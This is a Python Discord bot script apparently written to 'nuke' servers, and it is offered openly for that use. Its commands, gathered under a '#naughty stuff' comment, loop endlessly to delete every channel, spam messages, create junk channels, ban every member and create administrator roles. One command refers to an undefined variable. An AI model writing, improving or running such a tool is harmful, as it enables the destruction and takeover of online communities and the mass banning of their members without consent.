#Made by Sir Sinister
#Updated by Divovsk to be ran in the most recent discord.py

import discord
from discord.ext import commands
from discord.ext.commands import Bot
import asyncio
import time
import logging

client = commands.Bot(command_prefix="!", intents=discord.Intents.all()) #Command prefix is "!", but you can change it

@client.event
async def on_ready():
    print ("bot is now online") #Time to shine

#naughty stuff
@client.command(pass_context=True)
async def kill(ctx):
    while True:
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
                print(channel.name + " has been deleted in " + ctx.guild.name)
            finally:
                pass

@client.command(pass_context=True)
async def spam(ctx):
                while True:
                    await ctx.send("NUCLEAR BOMB!!!")

@client.command(pass_context=True)
async def spamchannels(ctx):
                while True:
                    channel = await guild.create_text_channel('nuked')

@client.command(pass_context=True)
async def megaban(ctx):
    for user in list(ctx.guild.members):
        try:
            await user.ban()
            print("User " + user.name + " has been banned from " + ctx.guild.name)
            print("Now that's alot of damage")
        finally:
                    while True:
                        for user in list(ctx.guild.members):
                            try:
                                await user.ban()
                                print("User " + user.name + " has been banned from " + ctx.guild.name)
                                print("Now that's alot of damage")
                            finally:
                                pass

@client.command(pass_context=True)
async def unlimitedroles(ctx):
    while True:
        server = ctx.guild
        perms = discord.Permissions(8)
        role = await ctx.guild.create_role(name="I'm him", permissions=perms)

client.run("") #Bot's Token Code Goes Here
